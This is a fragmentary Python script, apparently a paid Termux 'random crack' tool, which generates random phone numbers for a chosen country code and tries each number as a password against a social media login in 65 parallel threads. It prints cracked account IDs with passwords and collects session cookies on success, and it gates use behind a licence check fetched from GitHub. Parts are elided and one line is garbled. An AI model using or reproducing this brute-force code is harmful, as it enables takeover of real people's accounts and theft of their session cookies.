...
try:
    ...
    prox= requests.get('https://raw.githubusercontent.com/Nil500/aaaproval.txt/main/aaaproval').text
...
def uaku():
	try:
		...
		a=requests.get('https://raw.githubusercontent.com/Nil500/aaaproval.txt/main/aaaproval').text
		ua=open('.Let''s a fast, simple, and secure app we can use to message and call each other for free. Get it at https://whats')
...
def jalan(z):
    for e in z + '\n':
        ...
        sys.stdout.flush()
        time.sleep(0.03)
os.system("xdg-open https://raw.githubusercontent.com/Nil500/Approval.txt/main/Approval.txt")
...
def main_apv():
    ...
    try:
        ...
        key1=open('/data/data/com.termux/files/usr/bin/. Azim-cov', 'r').read()
    except IOError:
        os.system("clear")
        print(logo)
        print ("[*]--------------------------------------------------------------")
        ...
        print ("[*]--------------------------------------------------------------")
        print ("           THIS TOOL IS PAID Rs/BDt")
        ...
        kok=open('/data/data/com.termux/files/usr/bin/.Azim-Khan', 'w')
        kok.close()
        print ("")
        print ("")
        ...
        os.system("xdg-open https://wa.me/+8801914436101")
        #nichy  link hata k apni github ke link lagau
    r1=requests.get("https://raw.githubusercontent.com/Nil500/Approval.txt/main/Approval.txt").text
    if key1 in r1:
     ...
     main()
        ...
        time.sleep(3.5)
        #Numbr chnge krlyna
        os.system("xdg-open https://wa.me/+01914436101")

logo ="""\033[1;97m
       \033[1;32msss. d       b d s  b 
       \033[1;33md      S       S S  S S 
       \033[1;34mY      S       S S   SS   
       \033[1;35mss.  S       S S    S 
       \033[1;36m##  b S\033[1;35mS S    S    
       \033[1;37mP  S     S  S    S  
       \033[1;33m` ss'    "sss"   P    P 
\033[1;32m[+]==*==*==*==*==*==*==*==*==*==*==*==*===*=*=*==
\033[1;32m[+] \033[1;33mCREATED-MAn   :  \033[1;33mMR.Azim Khan
\033[1;32m[+] \033[1;34mON FACEBOK   :  \033[1;34mAzim Khan
\033[1;32m[+] \033[1;35mON GITHUB    :  \033[1;35mSUn-F1owers
\033[1;32m[+] \033[1;36mTOOL STATUS  :  \033[1;36mRANDOM -Crack 
\033[1;32m[+] \033[1;36mTOOL VIRSION :  \033[1;36m2.9.1
\033[1;32m[+]==*==*==*==*==*==*==*==*==*==*==*==**==*==*== *=
            \033[1;31m• \033[1;33m• \033[1;34m• \033[1;36mTEAM Sun-Flowers \033[1;31m• \033[1;33m• \033[1;34m• """
BLUE = '\033[1;32m'
...
def random_number():
    ...
    print(49*'=')
    kode = input('[+]\033[1;36m Show   Your Country Code: ')
    limit = int(input('How many numbers do you want to Added  ? '))
    ...
    with ThreadPool(max_workers=65) as yaari:
        ...
        jalan('random-creck has been started')
        jalan('Use flight mode Of-On for speed up')
        print('\033[1;32m[+]==============================================')
        for guru in uid:
            uid = kode+guru
            pwx = [guru]
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print('\033[1;95m[flower-CP] '+cid+' | '+ps+'\033[0;97m')
                cek_apk(session,coki)
